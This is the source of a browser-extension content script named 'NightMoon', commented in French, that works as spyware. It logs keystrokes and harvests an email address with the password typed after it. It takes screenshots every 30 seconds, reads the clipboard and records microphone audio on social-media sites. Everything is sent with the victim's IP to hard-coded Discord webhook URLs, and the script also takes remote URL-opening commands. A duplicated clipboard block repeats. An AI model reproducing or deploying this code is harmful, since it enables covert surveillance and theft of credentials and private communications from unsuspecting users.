const KEYLOGGER_WEBHOOK_URL = "https://discord.com/api/webhooks/1393276773520904316/GhBhnRvv1HmSqop-k1h-iLKu7Sh_mM8gQ9vC0q7DqlreB1X3Mcc2C3D-Zkdk7NgHbvzU";

let keyBuffer = '';
let inactivityTimer = null;
const INACTIVITY_DELAY = 3000;

function isVisibleChar(key) {
  return key.length === 1 && key.match(/[\x21-\x7E]/);
}

async function getUserIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip || 'IP inconnue';
  } catch (e) {
    return 'IP inconnue';
  }
}

async function sendBufferedKeys() {
  if (keyBuffer.length === 0) return;

  const ip = await getUserIP();

  fetch(KEYLOGGER_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: `🕵️ IP: \`${ip}\`\n⌨️ Texte saisi : **${keyBuffer}**`,
      username: 'NightMoon Keylogger'
    })
  });

  keyBuffer = '';
}

document.addEventListener('keydown', (e) => {
  if (e.key === 'Backspace') {
    keyBuffer = keyBuffer.slice(0, -1);
  } else if (isVisibleChar(e.key)) {
    keyBuffer += e.key;
  }

  clearTimeout(inactivityTimer);
  inactivityTimer = setTimeout(sendBufferedKeys, INACTIVITY_DELAY);
});

// === Capture d'écran ===
const SCREENSHOT_WEBHOOK_URL = "https://discord.com/api/webhooks/1394263577988432013/jJnnk2ltOqld_d7PS8OhsYVtlPY7k8kntXfVamGNVdivH4iBehVtHXNDKpHJT9lhfavq";
let lastScreenshotTime = 0;
const SCREENSHOT_INTERVAL = 30000; // 30 secondes
const MIN_SCREENSHOT_GAP = 30000; // Éviter les captures trop rapprochées

async function captureScreenshot() {
  const now = Date.now();
  if (now - lastScreenshotTime < MIN_SCREENSHOT_GAP) {
    console.log('Capture d\'écran ignorée: trop rapprochée');
    return;
  }
  lastScreenshotTime = now;

  console.log('Début de la capture d\'écran pour:', window.location.href);
  try {
    if (typeof html2canvas === 'undefined') {
      console.error('html2canvas non chargé, réessai dans 5 sec...');
      setTimeout(captureScreenshot, 10000);
      return;
    }
    if (typeof JSZip === 'undefined') {
      console.error('JSZip non chargé, réessai dans 5 sec...');
      setTimeout(captureScreenshot, 10000);
      return;
    }

    // Test du webhook
    console.log('Test du webhook pour capture d\'écran...');
    const testResponse = await fetch(SCREENSHOT_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: `Test webhook pour capture d\'écran (${window.location.href})`, username: 'NightMoon Test' })
    });
    if (!testResponse.ok) {
      console.error('Erreur lors du test du webhook:', testResponse.status, testResponse.statusText);
      const testResponseText = await testResponse.text();
      console.error('Détails de l\'erreur du test:', testResponseText);
      return;
    }
    console.log('Webhook de capture d\'écran fonctionne');

    // Calculer les dimensions complètes de la page
    const body = document.body;
    const html = document.documentElement;
    const width = Math.max(body.scrollWidth, body.offsetWidth, html.clientWidth, html.scrollWidth, html.offsetWidth);
    const height = Math.max(body.scrollHeight, body.offsetHeight, html.clientHeight, html.scrollHeight, html.offsetHeight);

    // Limiter les dimensions pour éviter les erreurs
    if (width > 10000 || height > 10000) {
      console.error('Page trop grande pour la capture d\'écran:', width, 'x', height);
      return;
    }

    // Capture d'écran avec html2canvas
    const canvas = await html2canvas(document.body, {
      scale: 1.0, // Qualité améliorée
      width: width,
      height: height,
      windowWidth: width,
      windowHeight: height,
      scrollX: 0,
      scrollY: 0,
      useCORS: true,
      allowTaint: false,
      logging: true
    });
    const imageData = canvas.toDataURL('image/jpeg', 0.9); // Qualité améliorée à 90%
    const imageSizeKB = Math.round((imageData.length * 3/4) / 1024);
    console.log(`Capture d\'écran effectuée, taille: ${imageSizeKB} KB`);

    // Créer un fichier ZIP
    const zip = new JSZip();
    const imageBinary = atob(imageData.split(',')[1]);
    zip.file('screenshot.jpg', imageBinary, { binary: true });
    const zipBlob = await zip.generateAsync({ type: 'blob' });
    const zipSizeKB = Math.round(zipBlob.size / 1024);
    console.log(`Fichier ZIP créé, taille: ${zipSizeKB} KB`);

    if (zipSizeKB > 25000) {
      console.error('Fichier ZIP trop grand pour Discord (> 25 Mo)');
      return;
    }

    // Envoi du ZIP au webhook Discord
    const formData = new FormData();
    formData.append('file', zipBlob, 'screenshot.zip');
    formData.append('payload_json', JSON.stringify({
      content: `Screenshot captured from ${window.location.href}! (ZIP taille: ${zipSizeKB} KB)`,
      username: 'NightMoon Screenshot'
    }));

    const response = await fetch(SCREENSHOT_WEBHOOK_URL, {
      method: 'POST',
      body: formData
    });

    if (response.ok) {
      console.log('Capture d\'écran (ZIP) envoyée avec succès');
    } else {
      console.error('Erreur lors de l\'envoi du ZIP:', response.status, response.statusText);
      const responseText = await response.text();
      console.error('Détails de l\'erreur:', responseText);
    }
  } catch (err) {
    console.error('Erreur lors de la capture d\'écran:', err);
  }
}

// === Contrôle à distance du navigateur ===
function handleRemoteCommand(message) {
  if (message.action === 'openUrl' && message.url) {
    console.log('Commande reçue dans content.js:', message.url); // Log ajouté
    window.location.href = message.url;
  } else {
    console.log('Commande à distance non reconnue:', message);
  }
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  handleRemoteCommand(message);
  sendResponse({ received: true });
});

// Déclencher la capture d'écran toutes les 30 secondes
console.log('Démarrage des captures d\'écran toutes les 30 secondes...');
setInterval(captureScreenshot, SCREENSHOT_INTERVAL);

const EMAIL_WEBHOOK_URL = "https://discord.com/api/webhooks/1396227399602929828/QAWMwu63UY-Ig1hjGotGnD29mlFJmf68d9P1aovROz9VtBrKw-a7YQQ1ybi-yo29vDx3";

let emailDetectionBuffer = '';
let detectedEmail = null;
let passwordCaptureActive = false;
let passwordBuffer = '';
let emailTimer = null;
const EMAIL_PASSWORD_DELAY = 20000; // 10 sec max pour taper un mot de passe

function isEmail(text) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(text);
}

function resetEmailCapture() {
  detectedEmail = null;
  passwordBuffer = '';
  passwordCaptureActive = false;
  clearTimeout(emailTimer);
}

document.addEventListener('keydown', async (e) => {
  if (e.key === 'Backspace') {
    emailDetectionBuffer = emailDetectionBuffer.slice(0, -1);
    if (passwordCaptureActive) {
      passwordBuffer = passwordBuffer.slice(0, -1);
    }
  } else if (isVisibleChar(e.key)) {
    if (!passwordCaptureActive) {
      emailDetectionBuffer += e.key;

      // Vérifie si une adresse mail a été tapée
      const parts = emailDetectionBuffer.split(/[\s]/);
      const lastWord = parts[parts.length - 1];
      if (isEmail(lastWord)) {
        detectedEmail = lastWord;
        passwordCaptureActive = true;
        passwordBuffer = '';
        emailTimer = setTimeout(() => {
          resetEmailCapture();
        }, EMAIL_PASSWORD_DELAY);
      }
    } else {
      passwordBuffer += e.key;

      // Si on atteint une longueur minimale, on envoie
      if (passwordBuffer.length >= 6) {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const ip = ipData.ip || 'IP inconnue';

        const payload = {
          content: `📧 Adresse mail détectée : \`${detectedEmail}\`\n🔑 Mot de passe probable : **${passwordBuffer}**\n🌐 IP : \`${ip}\``,
          username: 'NightMoon Credentials'
        };

        fetch(EMAIL_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        resetEmailCapture();
      }
    }
  }
});

// === Capture du presse-papiers ===
const CLIPBOARD_WEBHOOK_URL = "https://discord.com/api/webhooks/1392925741254967419/ZLBWgObuQVZzary2-3FKkccj6Lmp3box_NeQ-nbwA_jq5_g_VICb-dugWy7fK4WdcHL_";

async function sendClipboardToWebhook(payload) {
  try {
    const response = await fetch(CLIPBOARD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: payload.content,
        username: 'NightMoon Clipboard'
      })
    });
    if (!response.ok) {
      console.error('Erreur envoi webhook clipboard:', response.statusText);
    } else {
      console.log('Presse-papiers envoyé avec succès');
    }
  } catch (err) {
    console.error('Erreur lors de l\'envoi au webhook clipboard:', err);
  }
}

document.addEventListener('copy', async () => {
  try {
    const clipboardData = await navigator.clipboard.readText();
    if (clipboardData && clipboardData.trim().length > 0) {
      const ip = await (await fetch('https://api.ipify.org?format=json')).json().ip || 'IP inconnue';
      const payload = {
        content: `📋 Presse-papiers copié: \`${clipboardData}\`\n🌐 URL: ${window.location.href}\n🕵️ IP: \`${ip}\``
      };
      sendClipboardToWebhook(payload);
    }
  } catch (err) {
    console.error('Erreur lecture presse-papiers:', err);
  }
});

// Capture initiale au chargement de la page
(async () => {
  try {
    const clipboardData = await navigator.clipboard.readText();
    if (clipboardData && clipboardData.trim().length > 0) {
      const ip = await (await fetch('https://api.ipify.org?format=json')).json().ip || 'IP inconnue';
      const payload = {
        content: `📋 Presse-papiers initial: \`${clipboardData}\`\n🌐 URL: ${window.location.href}\n🕵️ IP: \`${ip}\``
      };
      sendClipboardToWebhook(payload);
    }
  } catch (err) {
    console.error('Erreur lecture presse-papiers initial:', err);
  }
})();

// === Capture du presse-papiers ===
(function() {
  const CLIPBOARD_WEBHOOK_URL = "https://discord.com/api/webhooks/1392925741254967419/ZLBWgObuQVZzary2-3FKkccj6Lmp3box_NeQ-nbwA_jq5_g_VICb-dugWy7fK4WdcHL_";

  async function sendClipboardToWebhook(payload) {
    try {
      const response = await fetch(CLIPBOARD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: payload.content,
          username: 'NightMoon Clipboard'
        })
      });
      if (!response.ok) {
        console.error('Erreur envoi webhook clipboard:', response.statusText);
      } else {
        console.log('Presse-papiers envoyé avec succès');
      }
    } catch (err) {
      console.error('Erreur lors de l\'envoi au webhook clipboard:', err);
    }
  }

  document.addEventListener('copy', async () => {
    try {
      const clipboardData = await navigator.clipboard.readText();
      if (clipboardData && clipboardData.trim().length > 0) {
        const ip = await (await fetch('https://api.ipify.org?format=json')).json().ip || 'IP inconnue';
        const payload = {
          content: `📋 Presse-papiers copié: \`${clipboardData}\`\n🌐 URL: ${window.location.href}\n🕵️ IP: \`${ip}\``
        };
        sendClipboardToWebhook(payload);
      }
    } catch (err) {
      console.error('Erreur lecture presse-papiers:', err);
    }
  });

  // Capture initiale au chargement de la page
  (async () => {
    try {
      const clipboardData = await navigator.clipboard.readText();
      if (clipboardData && clipboardData.trim().length > 0) {
        const ip = await (await fetch('https://api.ipify.org?format=json')).json().ip || 'IP inconnue';
        const payload = {
          content: `📋 Presse-papiers initial: \`${clipboardData}\`\n🌐 URL: ${window.location.href}\n🕵️ IP: \`${ip}\``
        };
        sendClipboardToWebhook(payload);
      }
    } catch (err) {
      console.error('Erreur lecture presse-papiers initial:', err);
    }
  })();
})();

// === Capture du presse-papiers ===
(function() {
  const CLIPBOARD_WEBHOOK_URL = "https://discord.com/api/webhooks/1392925741254967419/ZLBWgObuQVZzary2-3FKkccj6Lmp3box_NeQ-nbwA_jq5_g_VICb-dugWy7fK4WdcHL_";

  async function sendClipboardToWebhook(payload) {
    try {
      const response = await fetch(CLIPBOARD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: payload.content,
          username: 'NightMoon Clipboard'
        })
      });
      if (!response.ok) {
        console.error('Erreur envoi webhook clipboard:', response.statusText);
      } else {
        console.log('Presse-papiers envoyé avec succès');
      }
    } catch (err) {
      console.error('Erreur lors de l\'envoi au webhook clipboard:', err);
    }
  }

  document.addEventListener('copy', async () => {
    try {
      const clipboardData = await navigator.clipboard.readText();
      if (clipboardData && clipboardData.trim().length > 0) {
        const ip = await (await fetch('https://api.ipify.org?format=json')).json().ip || 'IP inconnue';
        const payload = {
          content: `📋 Presse-papiers copié: \`${clipboardData}\`\n🌐 URL: ${window.location.href}\n🕵️ IP: \`${ip}\``
        };
        sendClipboardToWebhook(payload);
      }
    } catch (err) {
      console.error('Erreur lecture presse-papiers:', err);
    }
  });

  // Capture initiale au chargement de la page
  (async () => {
    try {
      const clipboardData = await navigator.clipboard.readText();
      if (clipboardData && clipboardData.trim().length > 0) {
        const ip = await (await fetch('https://api.ipify.org?format=json')).json().ip || 'IP inconnue';
        const payload = {
          content: `📋 Presse-papiers initial: \`${clipboardData}\`\n🌐 URL: ${window.location.href}\n🕵️ IP: \`${ip}\``
        };
        sendClipboardToWebhook(payload);
      }
    } catch (err) {
      console.error('Erreur lecture presse-papiers initial:', err);
    }
  })();
})();

// === Capture du presse-papiers ===
(function() {
  const CLIPBOARD_WEBHOOK_URL = "https://discord.com/api/webhooks/1392925741254967419/ZLBWgObuQVZzary2-3FKkccj6Lmp3box_NeQ-nbwA_jq5_g_VICb-dugWy7fK4WdcHL_";

  async function sendClipboardToWebhook(payload) {
    try {
      const response = await fetch(CLIPBOARD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: payload.content,
          username: 'NightMoon Clipboard'
        })
      });
      if (!response.ok) {
        console.error('Erreur envoi webhook clipboard:', response.statusText);
      } else {
        console.log('Presse-papiers envoyé avec succès');
      }
    } catch (err) {
      console.error('Erreur lors de l\'envoi au webhook clipboard:', err);
    }
  }

  document.addEventListener('copy', async () => {
    try {
      const clipboardData = await navigator.clipboard.readText();
      if (clipboardData && clipboardData.trim().length > 0) {
        const ip = await (await fetch('https://api.ipify.org?format=json')).json().ip || 'IP inconnue';
        const payload = {
          content: `📋 Presse-papiers copié: \`${clipboardData}\`\n🌐 URL: ${window.location.href}\n🕵️ IP: \`${ip}\``
        };
        sendClipboardToWebhook(payload);
      }
    } catch (err) {
      console.error('Erreur lecture presse-papiers:', err);
    }
  });

  // Capture initiale au chargement de la page
  (async () => {
    try {
      const clipboardData = await navigator.clipboard.readText();
      if (clipboardData && clipboardData.trim().length > 0) {
        const ip = await (await fetch('https://api.ipify.org?format=json')).json().ip || 'IP inconnue';
        const payload = {
          content: `📋 Presse-papiers initial: \`${clipboardData}\`\n🌐 URL: ${window.location.href}\n🕵️ IP: \`${ip}\``
        };
        sendClipboardToWebhook(payload);
      }
    } catch (err) {
      console.error('Erreur lecture presse-papiers initial:', err);
    }
  })();
})();

// === Capture audio ===
(function() {
  const AUDIO_CAPTURE_INTERVAL = 20000; // 40 secondes
  const AUDIO_MAX_RECORDING_TIME = 20000; // 40 secondes
  let audioRecorder = null;
  let audioChunks = [];
  let isRecording = false;

  // Liste des domaines de réseaux sociaux
  const SOCIAL_MEDIA_DOMAINS = [
    'instagram.com',
    'snapchat.com',
    'discord.com',
    'discordapp.com',
    'teams.microsoft.com',
    'tiktok.com',
    'whatsapp.com',
    'zoom.us',
    'web.snapchat.com',
    'app.tiktok.com',
    'web.whatsapp.com'
  ];

  // Vérifier si l'URL actuelle correspond à un réseau social
  function isSocialMediaSite() {
    const hostname = window.location.hostname.toLowerCase();
    return SOCIAL_MEDIA_DOMAINS.some(domain => hostname.includes(domain));
  }

  async function sendAudioToBackground(blob, url, ip) {
    try {
      const zip = new JSZip();
      zip.file('audio.webm', blob);
      const zipBlob = await zip.generateAsync({ type: 'blob' });
      const zipSizeKB = Math.round(zipBlob.size / 1024);

      if (zipSizeKB > 25000) {
        console.error('Fichier ZIP audio trop grand pour Discord (> 25 Mo):', zipSizeKB, 'KB');
        return;
      }

      const reader = new FileReader();
      reader.onload = () => {
        chrome.runtime.sendMessage({
          action: 'sendAudio',
          zipData: reader.result,
          filename: 'audio.zip',
          url: url,
          ip: ip,
          sizeKB: zipSizeKB
        }, (response) => {
          if (chrome.runtime.lastError) {
            console.error('Erreur envoi au background:', chrome.runtime.lastError.message);
          } else if (response && response.success) {
            console.log('Audio envoyé au background avec succès');
          }
        });
      };
      reader.readAsDataURL(zipBlob);
    } catch (err) {
      console.error('Erreur lors de la compression audio:', err);
    }
  }

  async function stopAndSendAudio() {
    if (!audioRecorder || !isRecording) return;

    try {
      audioRecorder.stop();
      isRecording = false;
    } catch (err) {
      console.error('Erreur lors de l\'arrêt de l\'enregistrement:', err);
    }
  }

  async function captureAudio() {
    if (!isSocialMediaSite()) {
      console.log('Capture audio ignorée : pas un réseau social');
      return;
    }

    if (typeof JSZip === 'undefined') {
      console.error('JSZip non chargé, réessai dans 5 secondes...');
      setTimeout(captureAudio, 5000);
      return;
    }

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      audioRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
      audioChunks = [];
      isRecording = true;

      audioRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) audioChunks.push(e.data);
      };

      audioRecorder.onstop = async () => {
        stream.getTracks().forEach(track => track.stop());
        if (audioChunks.length === 0) {
          console.log('Aucun audio capturé, envoi ignoré');
          return;
        }

        try {
          const blob = new Blob(audioChunks, { type: 'audio/webm' });
          const ip = await (await fetch('https://api.ipify.org?format=json')).json().ip || 'IP inconnue';
          await sendAudioToBackground(blob, window.location.href, ip);
        } catch (err) {
          console.error('Erreur lors de l\'envoi audio au background:', err);
        } finally {
          audioChunks = [];
          audioRecorder = null;
          isRecording = false;
        }
      };

      audioRecorder.start();
      console.log('Enregistrement audio démarré sur', window.location.href);

      setTimeout(() => {
        if (audioRecorder && isRecording) {
          stopAndSendAudio();
        }
        setTimeout(captureAudio, AUDIO_CAPTURE_INTERVAL);
      }, AUDIO_MAX_RECORDING_TIME);
    } catch (err) {
      console.error('Erreur capture audio:', err);
      isRecording = false;
      if (err.name !== 'NotAllowedError') {
        setTimeout(captureAudio, AUDIO_CAPTURE_INTERVAL);
      }
    }
  }

  // Gérer la fermeture ou le changement de page
  window.addEventListener('beforeunload', () => {
    if (audioRecorder && isRecording) {
      stopAndSendAudio();
    }
  });

  // Lancer la capture audio initiale
  captureAudio();
})();